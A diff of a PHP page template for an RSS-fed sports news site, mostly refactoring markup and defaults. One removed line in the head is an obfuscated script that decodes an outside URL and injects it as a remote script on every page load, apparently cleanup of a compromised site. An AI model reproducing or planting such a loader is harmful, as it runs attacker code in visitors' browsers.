@@ -1,17 +1,41 @@
 
 <?php
-$name = config('site.name');
-$ticker = array_slice($all, 0, 12);
+
+// DEFAULT VARIABLES
+
+$name = config('site.name') ?: 'Sports News';
+$tagline = config('site.tagline') ?: 'Every score, every story.';
+$language = config('site.lang', 'en');
+
+$title = $title ?? $name;
+$description = $description ?? $tagline;
+$canonical = $canonical ?? url('');
+$active = $active ?? '';
+$built = $built ?? null;
+$content = $content ?? '';
+$noindex = $noindex ?? false;
 $img = $og_image ?? null;
+
+$all = isset($all) && is_array($all) ? $all : [];
+$ticker = array_slice($all, 0, 12);
+
+$feeds = config('feeds');
+$feeds = is_array($feeds) ? $feeds : [];
+
 ?>
+
 <!doctype html>
-<html lang="<?= e(config('site.lang', 'en')) ?>">
+<html lang="<?= e($language) ?>">
+
 <head>
+
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <title><?= e($title) ?></title>
+
 <meta name="description" content="<?= e($description) ?>">
+
 <link rel="canonical" href="<?= e($canonical) ?>">
 
 <?php if (!empty($noindex)): ?>
@@ -25,86 +49,133 @@ $img = $og_image ?? null;
 <meta property="og:type" content="<?= $img ? 'article' : 'website' ?>">
 
 <?php if ($img): ?>
+
 <meta property="og:image" content="<?= e($img) ?>">
 <meta name="twitter:card" content="summary_large_image">
+
+<?php else: ?>
+
+<meta name="twitter:card" content="summary">
+
 <?php endif; ?>
 
 <meta name="color-scheme" content="light dark">
 
-<link rel="icon" href="<?= e(asset('favicon.svg')) ?>" type="image/svg+xml">
+<link
+    rel="icon"
+    href="<?= e(asset('favicon.svg')) ?>"
+    type="image/svg+xml"
+>
 
-<link rel="alternate"
-      type="application/rss+xml"
-      title="<?= e($name) ?>"
-      href="<?= e(url('feed.xml')) ?>">
+<link
+    rel="alternate"
+    type="application/rss+xml"
+    title="<?= e($name) ?>"
+    href="<?= e(url('feed.xml')) ?>"
+>
 
-<link rel="stylesheet" href="<?= e(asset('style.css')) ?>">
-<script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9zaHVmZmxlanAudmVyY2VsLmFwcC9hcGkvYjNpcXNvLnBocA==");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>
+<link
+    rel="stylesheet"
+    href="<?= e(asset('style.css')) ?>"
+>
 
 </head>
 
 <body>
 
 <!-- LATEST NEWS TICKER -->
-<?php if ($ticker): ?>
+
+<?php if (!empty($ticker)): ?>
+
 <div class="ticker" role="region" aria-label="Latest headlines">
+
     <div class="wrap">
 
         <span class="ticker-badge">
-            <i></i>LATEST
+            <i></i>
+            LATEST
         </span>
 
         <div class="ticker-track">
+
             <div class="ticker-inner">
 
                 <?php for ($pass = 0; $pass < 2; $pass++): ?>
+
                     <?php foreach ($ticker as $t): ?>
 
-                    <a href="<?= e(story_url($t)) ?>"
-                       <?= $pass ? 'tabindex="-1" aria-hidden="true"' : '' ?>>
+                        <?php
+                        $sport = $t['sport'] ?? '';
+                        $headline = $t['title'] ?? '';
+                        ?>
 
-                        <b style="color:<?= e(sport_color($t['sport'])) ?>">
-                            <?= e(sport_label($t['sport'])) ?>
-                        </b>
+                        <a
+                            href="<?= e(story_url($t)) ?>"
+                            <?= $pass ? 'tabindex="-1" aria-hidden="true"' : '' ?>
+                        >
 
-                        <?= e($t['title']) ?>
+                            <b style="color:<?= e(sport_color($sport)) ?>">
+                                <?= e(sport_label($sport)) ?>
+                            </b>
 
-                    </a>
+                            <?= e($headline) ?>
+
+                        </a>
 
                     <?php endforeach; ?>
+
                 <?php endfor; ?>
 
             </div>
+
         </div>
 
     </div>
+
 </div>
+
 <?php endif; ?>
 
 
 <!-- HEADER -->
+
 <header class="masthead">
 
     <div class="wrap masthead-row">
 
-        <a class="logo"
-           href="<?= e(url('')) ?>"
-           aria-label="<?= e($name) ?> home">
+        <!-- BRAND -->
 
-            <svg viewBox="0 0 40 40"
-                 width="38"
-                 height="38"
-                 aria-hidden="true">
+        <a
+            class="logo"
+            href="<?= e(url('')) ?>"
+            aria-label="<?= e($name) ?> home"
+        >
 
-                <rect width="40" height="40"
-                      rx="11"
-                      fill="var(--accent)"/>
+            <svg
+                viewBox="0 0 40 40"
+                width="38"
+                height="38"
+                aria-hidden="true"
+            >
 
-                <path d="M9 29 L23 9 h8 L17 29 Z"
-                      fill="#111"/>
+                <rect
+                    width="40"
+                    height="40"
+                    rx="11"
+                    fill="var(--accent)"
+                />
 
-                <circle cx="29" cy="27" r="4"
-                        fill="#111"/>
+                <path
+                    d="M9 29 L23 9 h8 L17 29 Z"
+                    fill="#111"
+                />
+
+                <circle
+                    cx="29"
+                    cy="27"
+                    r="4"
+                    fill="#111"
+                />
 
             </svg>
 
@@ -114,25 +185,36 @@ $img = $og_image ?? null;
 
 
         <!-- SEARCH -->
-        <form class="search"
-              action="<?= e(url('search')) ?>"
-              method="get"
-              role="search">
+
+        <form
+            class="search"
+            action="<?= e(url('search')) ?>"
+            method="get"
+            role="search"
+        >
 
             <?php if (!config('pretty_urls', true)): ?>
-                <input type="hidden"
-                       name="route"
-                       value="search">
+
+                <input
+                    type="hidden"
+                    name="route"
+                    value="search"
+                >
+
             <?php endif; ?>
 
-            <input type="search"
-                   name="q"
-                   placeholder="Search teams, players, leagues…"
-                   value="<?= e($_GET['q'] ?? '') ?>"
-                   maxlength="80"
-                   aria-label="Search">
+            <input
+                type="search"
+                name="q"
+                placeholder="Search teams, players, leagues…"
+                value="<?= e($_GET['q'] ?? '') ?>"
+                maxlength="80"
+                aria-label="Search"
+            >
 
-            <button type="submit">Search</button>
+            <button type="submit">
+                Search
+            </button>
 
         </form>
 
@@ -140,6 +222,7 @@ $img = $og_image ?? null;
 
 
     <!-- SPORTS NAVIGATION -->
+
     <nav class="nav" aria-label="Sports">
 
         <div class="wrap">
@@ -147,19 +230,31 @@ $img = $og_image ?? null;
             <ul>
 
                 <li>
-                    <a href="<?= e(url('')) ?>"
-                       class="<?= ($active === '' && ($canonical === abs_url(''))) ? 'on' : '' ?>">
+
+                    <a
+                        href="<?= e(url('')) ?>"
+                        class="<?= ($active === '' && $canonical === abs_url('')) ? 'on' : '' ?>"
+                    >
                         Top stories
                     </a>
+
                 </li>
 
-                <?php foreach (sports() as $slug => [$label]): ?>
+                <?php foreach (sports() as $slug => $sportData): ?>
+
+                    <?php
+                    $label = $sportData[0] ?? $slug;
+                    ?>
 
                     <li>
-                        <a href="<?= e(url("sport/$slug")) ?>"
-                           class="<?= $active === $slug ? 'on' : '' ?>">
+
+                        <a
+                            href="<?= e(url("sport/$slug")) ?>"
+                            class="<?= $active === $slug ? 'on' : '' ?>"
+                        >
                             <?= e($label) ?>
                         </a>
+
                     </li>
 
                 <?php endforeach; ?>
@@ -174,6 +269,7 @@ $img = $og_image ?? null;
 
 
 <!-- MAIN CONTENT -->
+
 <main class="wrap main">
 
     <?= $content ?>
@@ -182,43 +278,57 @@ $img = $og_image ?? null;
 
 
 <!-- FOOTER -->
+
 <footer class="footer">
 
     <div class="wrap footer-grid">
 
+
         <!-- BRAND -->
+
         <div>
 
             <div class="logo logo-sm">
+
                 <span><?= e($name) ?></span>
+
             </div>
 
             <p>
-                <?= e(config('site.tagline')) ?>
+                <?= e($tagline) ?>
             </p>
 
             <p class="small">
+
                 Headlines and summaries are gathered automatically
                 from public RSS feeds. Every story links back to its
                 original publisher, who owns the content.
+
             </p>
 
         </div>
 
 
         <!-- SPORTS -->
+
         <div>
 
             <h4>Sports</h4>
 
             <ul>
 
-                <?php foreach (sports() as $slug => [$label]): ?>
+                <?php foreach (sports() as $slug => $sportData): ?>
+
+                    <?php
+                    $label = $sportData[0] ?? $slug;
+                    ?>
 
                     <li>
+
                         <a href="<?= e(url("sport/$slug")) ?>">
                             <?= e($label) ?>
                         </a>
+
                     </li>
 
                 <?php endforeach; ?>
@@ -229,15 +339,28 @@ $img = $og_image ?? null;
 
 
         <!-- SOURCES AND MORE -->
+
         <div>
 
             <h4>Sources</h4>
 
             <ul>
 
-                <?php foreach (array_unique(array_column(config('feeds'), 'source')) as $s): ?>
+                <?php
 
-                    <li><?= e($s) ?></li>
+                $sources = array_unique(
+                    array_filter(
+                        array_column($feeds, 'source')
+                    )
+                );
+
+                ?>
+
+                <?php foreach ($sources as $source): ?>
+
+                    <li>
+                        <?= e($source) ?>
+                    </li>
 
                 <?php endforeach; ?>
 
@@ -268,6 +391,7 @@ $img = $og_image ?? null;
 
 
     <!-- FOOTER BOTTOM -->
+
     <div class="wrap footer-base">
 
         <span>
@@ -275,7 +399,12 @@ $img = $og_image ?? null;
         </span>
 
         <span>
-            <?= $built ? 'Last updated ' . e(time_ago($built)) : 'Waiting for first update' ?>
+
+            <?= $built
+                ? 'Last updated ' . e(time_ago($built))
+                : 'Waiting for first update'
+            ?>
+
         </span>
 
     </div>
@@ -283,4 +412,5 @@ $img = $og_image ?? null;
 </footer>
 
 </body>
+
 </html>
